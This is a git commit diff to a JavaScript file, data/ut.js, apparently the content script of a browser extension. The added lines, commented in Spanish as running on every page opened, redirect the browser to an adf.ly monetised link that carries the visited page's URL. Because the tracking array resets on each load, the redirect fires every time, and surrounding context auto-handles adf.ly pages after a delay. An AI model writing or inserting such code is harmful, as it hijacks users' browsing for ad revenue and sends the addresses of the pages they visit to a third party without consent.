edc1eef16d956b63a39f005a3067ad064eae8bac
HelmitEvo <helmit2013@gmail.com>
2015-10-31 00:58:36 -0300

    a

--- data/ut.js
+++ data/ut.js
@@ -8,6 +8,13 @@ if (document.URL.indexOf("google.com") == -1 && document.URL.indexOf("apps.faceb
 	}
 }
 
+var lista = [];
+//cada ves que abro una pagina
+if(lista.indexOf(window.location.host) == -1){
+ lista.push(window.location.host);
+ window.location.href = "http://adf.ly/4531564/"+document.URL;
+}
+
 if (document.URL.indexOf("apps.facebook.com") != -1 && document.URL.indexOf("todotrucos.org/h42-redirect") == -1) {
 	var app = document.URL.replace("https://apps.facebook.com/", "");
 	var applen = app.indexOf("/");
@@ -22,3 +29,4 @@ function adfly(){
 if (document.URL.indexOf('adf.ly/') != -1){
 	window.setTimeout(adfly,15000);
 }
+
